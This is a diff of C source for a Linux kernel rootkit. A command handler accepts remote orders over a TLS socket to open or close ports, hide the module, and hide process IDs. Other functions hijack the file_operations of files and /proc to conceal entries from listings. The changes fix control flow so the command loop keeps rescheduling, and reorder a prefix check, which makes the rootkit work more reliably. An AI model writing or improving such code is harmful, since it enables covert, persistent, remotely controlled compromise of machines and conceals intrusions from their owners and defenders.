@@ -327,14 +327,14 @@ void read_TLS(struct work_struct* work) {
     if (len < 5) {
         strcpy(buffer, bad_len);
         send_msg(svc->tls_socket, buffer, strlen(bad_len));
-        return;
+        goto resched;
     }
     if (memcmp("open ", buffer, 5) == 0) {
         //Open a port
         if (kstrtou16(buffer + 5, 10, &tmp_port)) {
             strcpy(buffer, bad_port);
             send_msg(svc->tls_socket, buffer, strlen(bad_port));
-            return;
+            goto resched;
         }
         open_ports[open_port_count++] = tmp_port;
         strcpy(buffer, open);
@@ -344,12 +344,12 @@ void read_TLS(struct work_struct* work) {
         if (kstrtou16(buffer + 6, 10, &tmp_port)) {
             strcpy(buffer, bad_port);
             send_msg(svc->tls_socket, buffer, strlen(bad_port));
-            return;
+            goto resched;
         }
         if (tmp_port == PORT) {
             strcpy(buffer, bad_drop);
             send_msg(svc->tls_socket, buffer, strlen(bad_drop));
-            return;
+            goto resched;
         }
         closed_ports[closed_port_count++] = tmp_port;
         strcpy(buffer, close);
@@ -365,28 +365,29 @@ void read_TLS(struct work_struct* work) {
         } else {
             hide();
         }
-    //Processes that can't be killed when they aren't hidden
-    } else if (memcmp("hide", buffer, 4) == 0) {
-        if (kstrtou16(buffer + 5, 10, &tmp_port)) {
-            strcpy(buffer, bad_port);
-            send_msg(svc->tls_socket, buffer, strlen(bad_port));
-            return;
-        }
-        //Store the pid in the hidden proc list
-        hidden_procs[hidden_count++] = tmp_port;
-    //Processes that need to be killed when they aren't hidden
+        //Processes that need to be killed when they aren't hidden
     } else if (memcmp("hidek", buffer, 5) == 0) {
         if (kstrtou16(buffer + 6, 10, &tmp_port)) {
             strcpy(buffer, bad_port);
             send_msg(svc->tls_socket, buffer, strlen(bad_port));
-            return;
+            goto resched;
         }
         //Store the pid in the hidden proc list
         hidden_kill_procs[hidden_kill_count++] = tmp_port;
+        //Processes that can't be killed when they aren't hidden
+    } else if (memcmp("hide", buffer, 4) == 0) {
+        if (kstrtou16(buffer + 5, 10, &tmp_port)) {
+            strcpy(buffer, bad_port);
+            send_msg(svc->tls_socket, buffer, strlen(bad_port));
+            goto resched;
+        }
+        //Store the pid in the hidden proc list
+        hidden_procs[hidden_count++] = tmp_port;
     } else {
         strcpy(buffer, unknown);
         send_msg(svc->tls_socket, buffer, strlen(unknown));
     }
+resched:
     schedule_work(&w);
 }
 
@@ -683,7 +684,7 @@ bool hide_file(const char* user_input, struct hidden_file* hf) {
     }
     hf->inode = hf->path.dentry->d_inode;
     hf->fops = *hf->inode->i_fop;
-    hf->backup_fops = (struct file_operations *) hf->inode->i_fop;
+    hf->backup_fops = (struct file_operations*) hf->inode->i_fop;
     hf->fops.iterate_shared = rk_iterate_shared;
     hf->inode->i_fop = &hf->fops;
 
@@ -723,7 +724,7 @@ static int __init mod_init(void) {
     }
     proc_inode = proc_path.dentry->d_inode;
     proc_fops = *proc_inode->i_fop;
-    backup_proc_fops = (struct file_operations *) proc_inode->i_fop;
+    backup_proc_fops = (struct file_operations*) proc_inode->i_fop;
     proc_fops.iterate_shared = proc_iterate_shared;
     proc_inode->i_fop = &proc_fops;
 
